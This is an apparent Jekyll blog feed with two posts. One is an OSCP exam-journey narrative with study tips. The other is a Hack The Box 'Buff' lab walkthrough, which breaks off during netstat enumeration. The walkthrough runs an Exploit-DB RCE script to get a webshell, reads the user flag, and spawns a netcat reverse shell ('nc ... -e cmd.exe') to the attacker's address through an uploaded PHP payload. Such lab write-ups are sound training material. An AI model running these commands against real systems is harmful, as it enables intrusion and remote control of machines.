<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-04-07T20:22:38+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">C:\Users\DcodeZero</title><subtitle>Hacker || Penetration Tester|| CTF Player || Blogger ||Independent  Researcher || Red Team Enthusiast || security practitioner.
</subtitle><author><name>JC</name></author><entry><title type="html">My journey towards “TRY HARDER!”</title><link href="http://localhost:4000/otherposts/2020/10/17/OSCP.html" rel="alternate" type="text/html" title="My journey towards “TRY HARDER!”" /><published>2020-10-17T07:54:00+05:30</published><updated>2020-10-17T07:54:00+05:30</updated><id>http://localhost:4000/otherposts/2020/10/17/OSCP</id><content type="html" xml:base="http://localhost:4000/otherposts/2020/10/17/OSCP.html"><![CDATA[<hr />

<h1 id="overview">OverView</h1>
<p><img src="/assets/img/sample/oscp1.png" alt="" /> 
It was <code class="language-plaintext highlighter-rouge">one and half</code> years ago I completed my <code class="language-plaintext highlighter-rouge">C|EH</code> certification. Since then my only <code class="language-plaintext highlighter-rouge">aim</code> was to gain my <code class="language-plaintext highlighter-rouge">OSCP</code> no matter what it takes from me. I was ready to give my complete effort and dedication in order to gain my OSCP. This blog outlines <code class="language-plaintext highlighter-rouge">my journey towards OSCP</code> and I’ll be sharing some hints and guidelines at the end of the blog which can be helpful in gaining your OSCP as well.</p>

<hr />

<h1 id="background">Background</h1>
<p>Before I get started my journey towards OSCP, I am a computer science student, finished my <code class="language-plaintext highlighter-rouge">master’s degree</code>. But had no experience in the field of cyber security. I strongly had a passion towards security and precisely towards <code class="language-plaintext highlighter-rouge">breaking into things</code>. This is all the mind set required in cyber security industry. My first intension was to get my <code class="language-plaintext highlighter-rouge">C|EH</code>, but it has not satisfied me and I wanted more of it. Then I’ve taken <code class="language-plaintext highlighter-rouge">OSCP as a challenge</code> to myself and the journey begins now.</p>

<hr />

<h1 id="the-journey">The Journey</h1>

<p>This journey started about <code class="language-plaintext highlighter-rouge">9 months</code> ago, I took the <code class="language-plaintext highlighter-rouge">VIP</code> subscription from <code class="language-plaintext highlighter-rouge">Hack The Box</code> and started to hack into some <code class="language-plaintext highlighter-rouge">retired easy machines</code> to gain some skill and confidence. But the situation was quite difficult for me and I was unable to get even an initial foothold of any machine. However, within a short period, I was able to get the easy machines pawned. Once I gained confidence in cracking the machines, I slowly moved towards the <code class="language-plaintext highlighter-rouge">Active Machines</code> section. Within a period of 3 months I had all the easy and medium machine owned. <img src="/assets/img/sample/AMO.png" alt="" /> By the time of <code class="language-plaintext highlighter-rouge">6 months</code> after starting <code class="language-plaintext highlighter-rouge">HTB</code>, I almost had about 50+ machines owned. I had also completed the <code class="language-plaintext highlighter-rouge">TJNULL’s OSCP machines list</code>. At this point, I was pretty confident that I’m ready for my OSCP exam.</p>

<hr />

<h1 id="the-plan">The Plan</h1>

<p>Once I gained confidence, I felt like I’m ready for the battle. I came to know that there are <code class="language-plaintext highlighter-rouge">60+ machines</code> in the OSCP lab. My idea was to go with 2 months of lab time and hack into at least 40+ machines. I started my lab access on <code class="language-plaintext highlighter-rouge">2-8-20</code> and by the time of <code class="language-plaintext highlighter-rouge">1-10-20</code> I have done 54 machines, which I didn’t expect.</p>

<hr />

<h2 id="first-month">First Month</h2>

<p>In the beginning, I was given the access with credentials to log into the forums and the VPN to get connected to their network. The <code class="language-plaintext highlighter-rouge">guide lines</code> were straight forward and the <code class="language-plaintext highlighter-rouge">map</code> to hack the lab machines was quite interesting to me. This interested me more in doing a lot of machines and I strongly had a feeling that I’m going to learn a lot of things in this two months of my journey. I started to read the <code class="language-plaintext highlighter-rouge">material provided my Offensive Security</code> for 3 days and trying to complete a few machines if possible. The material consists of really good content and the videos were a lot helpful.</p>

<h2 id="second-month">Second Month</h2>

<p>I was pretty much <code class="language-plaintext highlighter-rouge">fed up</code> with doing scans manually as it is wasting a lot of my time, then I had to move towards <code class="language-plaintext highlighter-rouge">automation</code>. I have written my own scripts to automate the scans to make my work much easier. This way I learned a lot of coding and kind of automating. Slowly I was able to complete the <code class="language-plaintext highlighter-rouge">top 5 machines</code>, which made me feel awesome. Slowly the time passed by and now the fun part begins. At this point I almost had all the individual machines <code class="language-plaintext highlighter-rouge">compromised</code> and while tackling with the other machines, I was not able to get anything out of these machines. Looking out from the forums I understood that some machines have <code class="language-plaintext highlighter-rouge">dependencies</code> and some machines have a <code class="language-plaintext highlighter-rouge">chain of dependencies</code>. It took me a lot of time in understanding the dependencies and mapping it from one machine to the other. The overall journey in the lab time was <code class="language-plaintext highlighter-rouge">frustrating and fun</code>, I could never forget this ever.</p>

<hr />

<h1 id="before-exam">Before Exam</h1>

<p>I have <code class="language-plaintext highlighter-rouge">registered the exam</code> after a week to the end of my lab access. I tried to relax myself for the whole week and doing the <code class="language-plaintext highlighter-rouge">lab report</code> simultaneously. I was able to successfully complete the lab report within one-week and <code class="language-plaintext highlighter-rouge">revisited</code> all the machines that I’ve done in the lab. During this process I had made my own <code class="language-plaintext highlighter-rouge">cheat sheet</code> so that I can organize and remember the things well. Trust me this was a <code class="language-plaintext highlighter-rouge">life savior</code>. Just the day before the exam I was super nervous, my mind was <code class="language-plaintext highlighter-rouge">rushing</code> with different thoughts about the exam and keeping my mind stable and cool was <code class="language-plaintext highlighter-rouge">literally not possible</code>. After a good night sleep, I woke up with a fresh mind at <code class="language-plaintext highlighter-rouge">7 am</code>, had my breakfast and took a nice warm shower. It was about <code class="language-plaintext highlighter-rouge">two and half hours</code> just before the exam…</p>

<hr />

<h2 id="the-exam-plan">The Exam Plan</h2>

<blockquote>
  <p>Had to finish the buffer over flow machine in <code class="language-plaintext highlighter-rouge">2 hours</code> at maximum.<br />
Move to the easiest machine i.e. 10 marks machine and finish it in an <code class="language-plaintext highlighter-rouge">hour or two</code> at maximum.<br />
Then tackle with the other two 20 marks machines with in a time of <code class="language-plaintext highlighter-rouge">10 hours</code> maximum.<br />
If all goes in the planned way, I should be still having time for the last <code class="language-plaintext highlighter-rouge">25 marks machine</code>.<br /></p>
</blockquote>

<hr />

<h1 id="the-exam-time">The Exam Time</h1>
<p>I started my exam at <code class="language-plaintext highlighter-rouge">9:45 am</code> sharp. The guide lines are pretty straightforward and I picked the Buffer overflow machine as my first choice. It took me about 4 hours to solve the machine because of some silly and manual mistakes. Next, I went with the easiest <code class="language-plaintext highlighter-rouge">10 marks</code> machine which took me <code class="language-plaintext highlighter-rouge">15 min</code> to compromise the machine with some change in the exploit code. Though BOF took me <code class="language-plaintext highlighter-rouge">4 hours</code>, I managed to solve the <code class="language-plaintext highlighter-rouge">10 marks</code> machine super quick. So according to the plan I was going in the right direction with time. 
Once I knew that I had <code class="language-plaintext highlighter-rouge">35 marks</code> in hand, I took a small break and had my lunch. I got back to my seat at <code class="language-plaintext highlighter-rouge">2:00 pm</code> and started to tackle with one of the <code class="language-plaintext highlighter-rouge">20 marks</code> machine. An hour and half later I’m able to get the initial foothold of the machine. I tried harder for so much time to compromise the machine completely, but no luck after a really long time. Then I moved on to the other <code class="language-plaintext highlighter-rouge">20 marks</code> and tried hitting the machine for a really long time, but unable to get even an initial foothold out of it.</p>

<p>The time passed by really quick and now the time is <code class="language-plaintext highlighter-rouge">9:00 pm</code>, but still nothing. Realizing that I need to calm down myself, I took a straight <code class="language-plaintext highlighter-rouge">2 hours</code> of break and I spend some time with my parents and felt much better. I had a feeling that I’m going in a <code class="language-plaintext highlighter-rouge">wrong loop</code> and I had to break it. This thing is a <code class="language-plaintext highlighter-rouge">game changer</code>, I reverted the machine and started it from the beginning. Once the mind is clear and cool, the ideas are rushing in my head and my <code class="language-plaintext highlighter-rouge">methodology worked</code> fantastic in gaining the privileged access of the machine. My excitement was to peaks. By the time of <code class="language-plaintext highlighter-rouge">01:00 am</code>, I was having <code class="language-plaintext highlighter-rouge">55 marks</code> in my hand. I was so exhausted at this point, so I went for a quick powernap and headed my way again.</p>

<p>Knowing that I already had <code class="language-plaintext highlighter-rouge">55 marks</code>, now all I need is <code class="language-plaintext highlighter-rouge">15 marks</code> more to clear the exam. So, I started to tackle the other <code class="language-plaintext highlighter-rouge">20 marks</code> machine. Within no time I was able to get the root access of the machine. At this point I had <code class="language-plaintext highlighter-rouge">75 marks</code>, which is sufficient to pass the exam and now the time is around <code class="language-plaintext highlighter-rouge">03:00 am</code>. Now my plan of action is to reset all the <code class="language-plaintext highlighter-rouge">4 machines</code> and start them from the beginning and take screenshots of each and every step possible as screen recording is not possible now. By the time of <code class="language-plaintext highlighter-rouge">06:00 am</code>, I had my screenshots ready. I took another <code class="language-plaintext highlighter-rouge">2 hours</code> to verify all the things and confirm all are fine, I ended my exam at <code class="language-plaintext highlighter-rouge">08:00 am</code>. Oh YES! But wait, <code class="language-plaintext highlighter-rouge">the battle has not ended yet</code>.</p>

<h1 id="the-report">The Report</h1>

<p>It took me <code class="language-plaintext highlighter-rouge">5+ hours</code> to complete the <code class="language-plaintext highlighter-rouge">professional exam report</code> and I submitted it with in <code class="language-plaintext highlighter-rouge">24 hours</code> span of time. YES! The battle has finished and now I need to wait for the results to <code class="language-plaintext highlighter-rouge">be positive</code> with <code class="language-plaintext highlighter-rouge">fingers crossed</code>.</p>

<hr />
<hr />
<h1 id="the-output">The Output</h1>

<p>It took some where about <code class="language-plaintext highlighter-rouge">3-5 days</code> to get a mail from Offensive Security stating that <code class="language-plaintext highlighter-rouge">you have successfully completed the Penetration Testing with Kali Linux certification exam and have obtained your Offensive Security Certified Professional (OSCP) certification</code>. This is <code class="language-plaintext highlighter-rouge">the moment of truth</code>, I have been craving for months. Now I’m an <code class="language-plaintext highlighter-rouge">OSCP</code>, which I’m so proud of.<br /><br /><br /><img src="/assets/img/sample/OSCP.png" alt="" /></p>

<hr />
<hr />

<h1 id="tips-and-tricks">Tips and Tricks</h1>
<p><br /></p>

<h2 id="two-to-three-months-of-hackthebox-and-ippsecs-videos">Two to three months of <code class="language-plaintext highlighter-rouge">HackTheBox</code> and <code class="language-plaintext highlighter-rouge">Ippsec’s</code> videos<br /></h2>

<p>Yes! You definitely need a prior understanding how things work. The best way to learn is to start from the easy machines in HTB, then keep improving yourself.</p>

<h2 id="easy-rated-vulnhub-machines">Easy rated <code class="language-plaintext highlighter-rouge">vulnhub</code> machines.<br /></h2>

<p>Try to do as many boxes from <code class="language-plaintext highlighter-rouge">vulnhub</code>. once the machine is exploited, try to replicate the same vulnerability that you have exploited from the machine on a new machine. Doing so will teach you a lot of stuff.</p>

<h2 id="the-tjnulls-list-of-oscp-like-machines-">The <code class="language-plaintext highlighter-rouge">TJNULL’s List</code> of OSCP like machines. <br /></h2>

<p>As I was talking about it before, once you think you gained confidence doing <code class="language-plaintext highlighter-rouge">HTB</code> and <code class="language-plaintext highlighter-rouge">Vulnhub</code> machines you can make a <code class="language-plaintext highlighter-rouge">mock exam</code>, like taking a few machines from the list and trying to complete them in a <code class="language-plaintext highlighter-rouge">time constraint</code>.</p>

<h2 id="take-help-from-forums-and-communities">Take help from <code class="language-plaintext highlighter-rouge">forums</code> and <code class="language-plaintext highlighter-rouge">Communities</code>.<br /></h2>

<p>Yes! Take help from <code class="language-plaintext highlighter-rouge">forums</code> and other <code class="language-plaintext highlighter-rouge">communities</code>. There are really good people who can help you out in some way or the other way.</p>

<h2 id="the-cheat-sheets">The <code class="language-plaintext highlighter-rouge">Cheat Sheets</code>.<br /></h2>

<p>This might be funny but trust me, look at the cheat sheets available on google. There are plenty of them where you can find most of the stuff that is required for <code class="language-plaintext highlighter-rouge">OSCP and beyond</code>. Read the cheat sheet daily as if you are reading a <code class="language-plaintext highlighter-rouge">newspaper every day</code>. This will help you.</p>

<h2 id="last-but-not-the-least-">Last but not the least. <br /></h2>

<p>Use <code class="language-plaintext highlighter-rouge">GOOGLE</code> to figure out the things that you have no idea about, even if it is small thing. Using the keywords properly with the help of google will solve your most of your problems.</p>

<hr />
<hr />

<h1 id="the-final-touch">The Final Touch</h1>

<p>I hope that you liked my blog and this blog might help the other who are aiming for their <code class="language-plaintext highlighter-rouge">OSCP</code>.
In the end I wanted to say that this has been a wonderful journey to me.</p>]]></content><author><name>jeevan</name></author><category term="[&quot;otherposts&quot;]" /><category term="OSCP" /><category term="TryHarder" /><summary type="html"><![CDATA[This is the blog that describes my journey towards OSCP and the struggles I have face to gain my OSCP certification.]]></summary></entry><entry><title type="html">HackTheBox Buff</title><link href="http://localhost:4000/hackthebox/retired/2020/07/23/Buff.html" rel="alternate" type="text/html" title="HackTheBox Buff" /><published>2020-07-23T12:54:00+05:30</published><updated>2020-07-23T12:54:00+05:30</updated><id>http://localhost:4000/hackthebox/retired/2020/07/23/Buff</id><content type="html" xml:base="http://localhost:4000/hackthebox/retired/2020/07/23/Buff.html"><![CDATA[<h2 id="info">Info</h2>

<table>
  <thead>
    <tr>
      <th>Buff</th>
      <th> </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>OS:</td>
      <td>Windows</td>
    </tr>
    <tr>
      <td>Difficulty:</td>
      <td>Easy</td>
    </tr>
    <tr>
      <td>Points:</td>
      <td>20</td>
    </tr>
    <tr>
      <td>Release:</td>
      <td>18 Jul 2020</td>
    </tr>
    <tr>
      <td>IP:</td>
      <td>10.10.10.198</td>
    </tr>
  </tbody>
</table>

<h2 id="lets-get-started">Let’s get started</h2>

<h3 id="as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="n">sV</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">-</span><span class="n">sC</span> <span class="o">-</span><span class="no">A</span> <span class="o">-</span><span class="no">T4</span> <span class="n">buff</span><span class="p">.</span><span class="nf">htb</span> 
<span class="no">Starting</span> <span class="no">Nmap</span> <span class="mf">7.80</span> <span class="p">(</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">23</span> <span class="mo">05</span><span class="p">:</span><span class="mi">58</span> <span class="no">EDT</span>
<span class="no">Nmap</span> <span class="nb">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">buff</span><span class="p">.</span><span class="nf">htb</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.198</span><span class="p">)</span>
<span class="no">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.19</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="no">Not</span> <span class="ss">shown: </span><span class="mi">999</span> <span class="n">filtered</span> <span class="n">ports</span>
<span class="no">PORT</span>     <span class="no">STATE</span> <span class="no">SERVICE</span> <span class="no">VERSION</span>
<span class="mi">8080</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="no">Apache</span> <span class="n">httpd</span> <span class="mf">2.4</span><span class="o">.</span><span class="mi">43</span> <span class="p">((</span><span class="no">Win64</span><span class="p">)</span> <span class="no">OpenSSL</span><span class="o">/</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">1</span><span class="n">g</span> <span class="no">PHP</span><span class="o">/</span><span class="mf">7.4</span><span class="o">.</span><span class="mi">6</span><span class="p">)</span>
<span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="nb">open</span><span class="o">-</span><span class="ss">proxy: </span><span class="no">Potentially</span> <span class="no">OPEN</span> <span class="n">proxy</span><span class="o">.</span>
<span class="o">|</span><span class="n">_Methods</span> <span class="n">supported</span><span class="ss">:CONNECTION</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="ss">header: </span><span class="no">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">43</span> <span class="p">(</span><span class="no">Win64</span><span class="p">)</span> <span class="no">OpenSSL</span><span class="o">/</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">1</span><span class="n">g</span> <span class="no">PHP</span><span class="o">/</span><span class="mf">7.4</span><span class="o">.</span><span class="mi">6</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="ss">title: </span><span class="n">mrb3n</span><span class="err">'</span><span class="n">s</span> <span class="no">Bro</span> <span class="no">Hut</span>
<span class="no">Warning</span><span class="p">:</span> <span class="no">OSScan</span> <span class="n">results</span> <span class="n">may</span> <span class="n">be</span> <span class="n">unreliable</span> <span class="n">because</span> <span class="n">we</span> <span class="n">could</span> <span class="ow">not</span> <span class="n">find</span> <span class="n">at</span> <span class="n">least</span> <span class="mi">1</span> <span class="nb">open</span> <span class="ow">and</span> <span class="mi">1</span> <span class="n">closed</span> <span class="n">port</span>
<span class="no">Device</span> <span class="ss">type: </span><span class="n">general</span> <span class="n">purpose</span>
<span class="no">Running</span> <span class="p">(</span><span class="no">JUST</span> <span class="no">GUESSING</span><span class="p">):</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">XP</span><span class="o">|</span><span class="mi">7</span> <span class="p">(</span><span class="mi">86</span><span class="o">%</span><span class="p">)</span>
<span class="no">OS</span> <span class="no">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:microsoft:windows_xp</span><span class="o">::</span><span class="n">sp2</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:microsoft:windows_7</span>
<span class="no">Aggressive</span> <span class="no">OS</span> <span class="ss">guesses: </span><span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">XP</span> <span class="no">SP2</span> <span class="p">(</span><span class="mi">86</span><span class="o">%</span><span class="p">),</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="mi">7</span> <span class="p">(</span><span class="mi">85</span><span class="o">%</span><span class="p">)</span>
<span class="no">No</span> <span class="n">exact</span> <span class="no">OS</span> <span class="n">matches</span> <span class="k">for</span> <span class="n">host</span> <span class="p">(</span><span class="nb">test</span> <span class="n">conditions</span> <span class="n">non</span><span class="o">-</span><span class="n">ideal</span><span class="p">)</span><span class="o">.</span>
<span class="no">Network</span> <span class="no">Distance</span><span class="p">:</span> <span class="mi">2</span> <span class="n">hops</span>

<span class="no">TRACEROUTE</span> <span class="p">(</span><span class="n">using</span> <span class="n">port</span> <span class="mi">8080</span><span class="o">/</span><span class="n">tcp</span><span class="p">)</span>
<span class="no">HOP</span> <span class="no">RTT</span>       <span class="no">ADDRESS</span>
<span class="mi">1</span>   <span class="mf">195.99</span> <span class="n">ms</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">14.1</span>
<span class="mi">2</span>   <span class="mf">196.06</span> <span class="n">ms</span> <span class="n">buff</span><span class="p">.</span><span class="nf">htb</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.198</span><span class="p">)</span>

<span class="no">OS</span> <span class="ow">and</span> <span class="no">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="no">Please</span> <span class="n">report</span> <span class="n">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
<span class="no">Nmap</span> <span class="ss">done: </span><span class="mi">1</span> <span class="no">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="k">in</span> <span class="mf">57.75</span> <span class="n">seconds</span>
</code></pre></div></div>
<p><img src="/assets/img/sample/buff/buff1.png" alt="" /></p>

<h2 id="finding-the-cve-from-exploit-db">Finding the CVE from Exploit-db</h2>

<p><code class="language-plaintext highlighter-rouge">https://www.exploit-db.com/exploits/48506</code></p>

<h2 id="using-the-exploit">Using the Exploit</h2>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="mi">48506</span><span class="p">.</span><span class="nf">py</span> 
            <span class="sr">/\
/</span><span class="n">vvvvvvvvvvvv</span> <span class="p">\</span><span class="o">--------------------------------------</span><span class="p">,</span>
<span class="sb">`^^^^^^^^^^^^ /============BOKU====================="
            </span><span class="se">\/</span><span class="sb">                                                                                                                                                                                                                             
                                                                                                                                                                                                                                           
(+) Usage:       python 48506.py &lt;WEBAPP_URL&gt;                                                                                                                                                                                              
(+) Example:     python 48506.py 'https://10.0.0.3:443/gym/'  
</span></code></pre></div></div>
<h2 id="exploiting">Exploiting…..</h2>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="mi">48506</span><span class="p">.</span><span class="nf">py</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">buff</span><span class="p">.</span><span class="nf">htb</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span>                                                                                                                                                                                
            <span class="sr">/\                                                                                                                                                                                                                             
/</span><span class="n">vvvvvvvvvvvv</span> <span class="p">\</span><span class="o">--------------------------------------</span><span class="p">,</span>                                                                                                                                                                                     
<span class="sb">`^^^^^^^^^^^^ /============BOKU====================="                                                                                                                                                                                      
            </span><span class="se">\/</span><span class="sb">                                                                                                                                                                                                                             
                                                                                                                                                                                                                                           
[+] Successfully connected to webshell.                                                                                                                                                                                                    
C:</span><span class="se">\xa</span><span class="sb">mpp</span><span class="se">\h</span><span class="sb">tdocs</span><span class="se">\g</span><span class="sb">ym</span><span class="se">\u</span><span class="sb">pload&gt;              
</span></code></pre></div></div>
<h2 id="getting-usertxt">Getting User.txt</h2>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">C</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span><span class="n">htdocs</span><span class="p">\</span><span class="n">gym</span><span class="p">\</span><span class="n">upload</span><span class="o">&gt;</span> <span class="n">whoami</span> <span class="sr">/all                                                                                                                                                                                                    
�PNG                                                                                                                                                                                                                                       
▒                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                           
USER INFORMATION
----------------

User Name  SID                                           
========== ==============================================
buff\shaun S-1-5-21-2277156429-3381729605-2640630771-1001


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                     Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

</span></code></pre></div></div>

<p>From here I came to see what is the username..</p>

<p><code class="language-plaintext highlighter-rouge">buff\shaun S-1-5-21-2277156429-3381729605-2640630771-1001</code></p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="no">C</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span><span class="n">htdocs</span><span class="p">\</span><span class="n">gym</span><span class="p">\</span><span class="n">upload</span><span class="o">&gt;</span> <span class="n">type</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">shaun</span><span class="p">\</span><span class="no">Desktop</span><span class="p">\</span><span class="n">user</span><span class="p">.</span><span class="nf">txt</span>
<span class="err">�</span><span class="no">PNG</span>
<span class="err">▒</span>
<span class="mi">5345</span><span class="n">fe517be93e1b736b12b0267654c2</span>

</code></pre></div></div>

<p>Now let’s visit the <code class="language-plaintext highlighter-rouge">http://buff.htb:8080/upload.php</code> too see anything intresting?</p>

<p><img src="/assets/img/sample/buff/buff2.png" alt="" /></p>

<p>From the image we can see that the shell I got is not that great.. So I moved to gain the shell from the uploaded payload from the URL.</p>

<p><img src="/assets/img/sample/buff/buff3.png" alt="" /></p>

<p><code> http://buff.htb:8080/upload/kamehameha.php?telepathy=nc 10.10.14.51 5566 -e cmd.exe</code></p>

<p><img src="/assets/img/sample/buff/buff4.png" alt="" />
<img src="/assets/img/sample/buff/buff5.png" alt="" /></p>

<h3 id="now-time-to-find-the-vulnerable-service">Now time to find the Vulnerable Service..</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C</span><span class="p">:</span>\<span class="n">xampp</span>\<span class="n">htdocs</span>\<span class="n">gym</span>\<span class="n">upload</span><span class="o">&gt;</span><span class="n">netstat</span> <span class="o">-</span><span class="n">an</span>
<span class="n">netstat</span> <span class="o">-</span><span class="n">an</span>

<span class="n">Active</span> <span class="n">Connections</span>

  <span class="n">Proto</span>  <span class="n">Local</span> <span class="n">Address</span>          <span class="n">Foreign</span> <span class="n">Address</span>        <span class="n">State</span>
  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">135</span>            <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">445</span>            <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">4444</span>           <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">4545</span>           <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">5040</span>           <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">7680</span>           <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">8080</span>           <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">9999</span>           <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">49664</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">49665</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">49666</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">49667</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">49668</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
